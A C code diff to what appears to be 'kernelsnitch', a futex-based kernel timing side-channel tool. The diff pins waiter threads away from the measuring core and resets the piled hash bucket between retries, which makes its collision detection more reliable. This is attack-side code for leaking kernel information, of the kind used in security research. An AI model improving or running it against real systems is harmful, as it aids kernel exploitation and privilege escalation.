@@ -117,12 +117,19 @@ static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const st
 struct inc_arg {
     struct kernelsnitch_shared_state *ks;
     size_t id;
+    size_t core;
 };
 static void *__do_increase(void *arg)
 {
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
+    size_t core = inc_arg->core;
+    /* pin this piled waiter away from the measuring core to avoid preempting it */
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
     SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
     free(inc_arg);
     return 0;
@@ -137,10 +144,13 @@ static void *__do_increase(void *arg)
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
     pthread_t tid;
+    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpus < 2) ncpus = 2;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
+        inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
         SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
     }
     WAIT();
@@ -368,6 +378,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         }
     }
     free(t_before);
+    /* wake/clear the piled bucket so the next retry's two-phase measurement
+     * starts from a clean (unpiled) baseline */
+    __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE,
+            APPENDED_FUTEXES + 16, NULL, NULL, 0);
+
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
